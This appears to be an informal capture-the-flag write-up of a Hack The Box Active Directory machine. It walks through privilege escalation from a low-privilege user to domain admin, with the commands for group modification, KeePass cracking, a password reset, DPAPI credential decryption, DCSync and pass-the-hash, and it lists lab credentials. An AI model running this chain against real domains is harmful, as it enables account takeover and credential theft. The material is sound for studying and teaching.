Started with a nmap scan
```
53 DNS
88 kerberos
111 rpcbind
135 RPC
139  smb
445 SMB 
593
2049
```
And the room gives us a login to use `levi.james/KingofAkron2025!` with this login we can access the SMB but only have access to 3 shares with READ only access
```
IPC$
NETLOGON
SYSVOL
```
Ran bloodhound and `levi` is a member of HR and it has `GenericWrite` on Developers so we need to run this command to add us to the dev group 
```
net rpc group addmem "DEVELOPERS" "levi.james" -U "PUPPY.HTB"/"levi.james"%'KingofAkron2025!' -S "10.10.11.70"
and to check 
net rpc group members "DEVELOPERS"  -U "PUPPY.HTB"/"levi.james"%'KingofAkron2025!' -S "10.10.11.70"
```
and now we are dev group and can access the dev share on smb and there is a file called `recovery.kdbx` we cant use `keepass2john` it wont work so we have to use a script called `keepass2brute` on github and we cracked it to `liverpool` and now we have unlocked the file and we got users and passwords we can take this list of passwords and test it against are list of users and we got access to another account `ant.edwards:Antman2025!` and if you look in bloodhound we have `GenericALL` on `adam.silver` so we can change his password with this command
`bloodyAD --host 10.10.11.70 -d dc.puppy.htb -u 'ant.edwards' -p 'Antman2025!' set password ADAM.SILVER testpass123` but looking at this now in bloodhound the account is not active so we need to activate it 
```
ldapmodify -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W << EOF
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
chnagetype: modify
replace: userAccountControl
userAccountControl: 66048
EOF
```
Now we ca winrm into `adam.silver` and now lets get new bloodhound data as this user looking around with the host machine with this user we can see there is a `backup` folder in the `C:\` and there is a site backup we can download this and look at it there is a file called `nms-auth-config.xml.bak` and there is creds for another user `steph.cooper:ChefSteph2025!` and we can winrm as this user looking at bloodhound there not much we can do but looking around the file system we found some DPAPI keys so we need to setup a smb share so we can get the files 
`impacket-smbserver share ./share -smb2share`
`C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\sid\file` 
`C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\file` 
now we can decrypt it with Impacket
`impacket-dpapi masterkey -file masterkey_blob -password ChefSteph2025! -sid sid` 
`impacket-dpapi credential -file credential_blob -key (key)` 
and we get the login for the next user `steph.cooper_adm:FivethChipOnItsWay2025!` looking at bloodhound agin we can dcsync to get the admin user 
`impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70`
and now we can evil-winrm into the admin user with the hash 